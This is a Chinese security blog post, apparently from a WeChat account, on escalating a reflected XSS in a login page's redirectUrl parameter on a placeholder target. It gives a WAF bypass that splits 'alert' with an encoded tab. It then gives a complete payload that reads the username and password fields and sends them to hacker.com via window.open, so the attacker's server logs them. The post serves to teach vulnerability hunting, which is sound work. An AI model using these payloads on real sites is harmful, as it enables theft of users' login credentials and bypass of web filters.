#  一则不能弹出cookie的XSS漏洞的危害升级

原创 dandh811 [ 薯条机器猫 ](javascript:void\(0\);)

**薯条机器猫** ![]()

微信号 gh_fe8eae7d8dce

功能介绍 专注漏洞挖掘技术分享。

____

___发表于_

假定测试目标：example.com

打开被测系统，是一个登录页面：https://passport.example.com/login/index.html?redirectUrl=https://www.example.com/#/

发现redirectUrl参数值可控，参数值会写入到登录表单form的action参数中，可能存在XSS漏洞和url跳转漏洞。让我们试一试。构造payload如下：

  * 

    
    
    https://passport.example.com/login/index.html?redirectUrl=javascript:alert(/xss/)

但是被阻断了，后端有WAF之类的。

经多次尝试，是可以绕过的，payload为：

  * 

    
    
    javascript:al%09ert(/xss/)

被害用户点击攻击者构造的url，登录后触发xss弹窗。

进一步试试能否弹出cookie  

  * 

    
    
    javascript:al%09ert(document.cookie)

弹窗了，但是返回为空。可能是cookie中设置了某些安全属性，那么这种漏洞的危害非常有限了。  

正在准备放弃时，突然想到如果无法获取被害用户的cookie，那么能否获取他的密码呢？如果可以的话，跟发送cookie的性质就类似，甚至危害还更大。

尝试做了些这方面的尝试，最终证明是可以的，构造payload如下：

  * 

    
    
    https://passport.example.com/login/index.html?redirectUrl=javascript:window.op%09en(%22https://hacker.com/%22+document.getElementsByClassName("input-default")[0].value+"/"+document.getElementsByClassName("input-default")[1].value)

getElementsByClassName("input-default")[0].value
获取到用户名的值，getElementsByClassName("input-default")[1].value 获取到密码的值

将完整的url发送给被害用户，用户登录时，js部分会获取用户输入的用户名和密码，并使用window.open函数跳转到攻击者的网站。

最终攻击者的服务器就会收到这样一条日志：  

https://hacker.com/(username)/(password)  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 一则不能弹出cookie的XSS漏洞的危害升级

原创 dandh811 [ 薯条机器猫 ](javascript:void\(0\);)

轻触阅读原文

![]()

薯条机器猫

赞 分享 在看

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

